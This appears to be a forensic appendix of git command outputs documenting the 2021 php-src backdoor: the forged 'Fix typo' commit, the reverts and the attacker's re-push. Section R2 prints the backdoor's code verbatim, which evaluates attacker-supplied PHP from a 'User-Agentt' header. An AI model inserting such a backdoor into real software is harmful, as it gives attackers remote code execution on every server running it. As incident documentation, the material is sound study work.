# Receipts — ch. 12 php-src (the zerodium backdoor)

Verbatim outputs against a full clone of php/php-src.
Regenerate with `scripts/receipts-12.sh`. Long outputs truncated editorially (head).

## R1 — the commit that calls itself a typo, signed by the founder
```
$ git -C repos/php show -s --format=fuller c730aa26bd
commit c730aa26bd52829a49f2ad284b181b7e82a68d7d
Author:     Rasmus Lerdorf <rasmus@lerdorf.com>
AuthorDate: Sun Mar 28 05:57:07 2021 +0200
Commit:     Rasmus Lerdorf <rasmus@lerdorf.com>
CommitDate: Sun Mar 28 05:57:07 2021 +0200

    [skip-ci] Fix typo
    
    Fixes minor typo.
    
    Signed-off-by: Rasmus Lerdorf <rasmus@lerdorf.com>
```

## R2 — the diff: eleven lines that evaluate an attacker's header
```
$ git -C repos/php show c730aa26bd -- ext/zlib/zlib.c | grep -E '^\+' | grep -vE '^\+\+\+'
+	zval *enc;
+
+	if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
+		(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
+		convert_to_string(enc);
+		if (strstr(Z_STRVAL_P(enc), "zerodium")) {
+			zend_try {
+				zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
+			} zend_end_try();
+		}
+	}
```

## R3 — Rasmus's only Signed-off-by in the entire repository
```
$ git -C repos/php log --all --author=Rasmus --grep='Signed-off-by' --format='%H %aI %ae %s'
c730aa26bd52829a49f2ad284b181b7e82a68d7d 2021-03-28T05:57:07+02:00 rasmus@lerdorf.com [skip-ci] Fix typo
```

## R4 — the real Rasmus commits sit in American timezones; the fake is +0200 at dawn
```
$ git -C repos/php log --all --author='rasmus@lerdorf.com' --format='%aI %s' | head -6
2026-03-19T04:12:45-04:00 Fix GH-21411: opcache_compile_file() fails to early-bind classes without parents (#21412)
2021-03-28T05:57:07+02:00 [skip-ci] Fix typo
2019-10-23T14:34:12-07:00 Reverting push to wrong repo
2019-10-23T14:31:27-07:00 Update alloc patch
2019-05-21T14:47:28-07:00 Merge branch 'PHP-7.4'
2019-05-21T14:46:44-07:00 Merge branch 'PHP-7.3' into PHP-7.4
```

## R5 — five hours later: the revert names it a compromised account
```
$ git -C repos/php show -s --format=fuller 046827a7e8
commit 046827a7e867bb0e655923c75c25a20d06e3aa8b
Author:     Nikita Popov <nikita.ppv@gmail.com>
AuthorDate: Sun Mar 28 11:16:39 2021 +0200
Commit:     Nikita Popov <nikita.ppv@gmail.com>
CommitDate: Sun Mar 28 11:16:39 2021 +0200

    Revert "[skip-ci] Fix typo"
    
    This reverts commit c730aa26bd52829a49f2ad284b181b7e82a68d7d.
    
    This looks like the result of a compromised git account. Commit
    access has already been revoked.
```

## R6 — the attacker comes back wearing Nikita's name; identical tree
```
$ git -C repos/php show -s --format='%h %aI %an <%ae> %s' 2b0f239b21
2b0f239b211 2021-03-28T18:15:57+02:00 Nikita Popov <nikita.ppv@gmail.com> Revert "Revert "[skip-ci] Fix typo""
```

```
$ git -C repos/php rev-parse 'c730aa26^{tree}' '2b0f239b^{tree}'
a1c87b3d3dcea24d3f232a65345b66c4968a6ed3
a1c87b3d3dcea24d3f232a65345b66c4968a6ed3
```

## R7 — the whole four-commit revert war (pickaxe on the payload word)
```
$ git -C repos/php log --all -S zerodium --format='%h %aI %an %s' -- ext/zlib/zlib.c
8d743d5281c 2021-03-28T11:53:17-06:00 Levi Morrison Revert "Revert "Revert "[skip-ci] Fix typo"""
2b0f239b211 2021-03-28T18:15:57+02:00 Nikita Popov Revert "Revert "[skip-ci] Fix typo""
046827a7e86 2021-03-28T11:16:39+02:00 Nikita Popov Revert "[skip-ci] Fix typo"
c730aa26bd5 2021-03-28T05:57:07+02:00 Rasmus Lerdorf [skip-ci] Fix typo
```

```
$ git -C repos/php log --all --grep=zerodium --oneline | wc -l   # zero: the word is never in a message
0
```

## R8 — both malicious commits are ancestors of master today
```
$ git -C repos/php merge-base --is-ancestor c730aa26bd HEAD && echo 'c730aa26: ANCESTOR of HEAD'
c730aa26: ANCESTOR of HEAD
```

```
$ git -C repos/php merge-base --is-ancestor 2b0f239b21 HEAD && echo '2b0f239b: ANCESTOR of HEAD'
2b0f239b: ANCESTOR of HEAD
```

## R9 — the day after: the door the attacker came through is removed from the docs
```
$ git -C repos/php show -s --format='%h %aI %an <%ae>%n%s' 49a20cf3db
49a20cf3db6 2021-03-29T13:34:25+02:00 Bartosz Gorski <bartosz.m.gorski@gmail.com>
Removed mentions of git.php.net from the documentation
```

```
$ git -C repos/php show 49a20cf3db -- README.md | grep -E '^[+-]' | grep -iE 'git.php.net|mirror|github' | head -5
-[git.php.net](https://git.php.net). Contributions are most welcome by forking
-the [GitHub mirror repository](https://github.com/php/php-src) and sending a
+[GitHub repository](https://github.com/php/php-src) and sending a pull request.
-Pull requests are not merged directly on GitHub. All PRs will be pulled and
-pushed through [git.php.net](https://git.php.net). See
```

## R10 — the canonical remote moved: today's tip is committed by GitHub
```
$ git -C repos/php log -1 --format='%h %aI committer=%cn <%ce>%n%s'
19bbfbdba59 2026-08-19T13:49:21+08:00 committer=GitHub <noreply@github.com>
[skip ci] fix NEWS section order
```

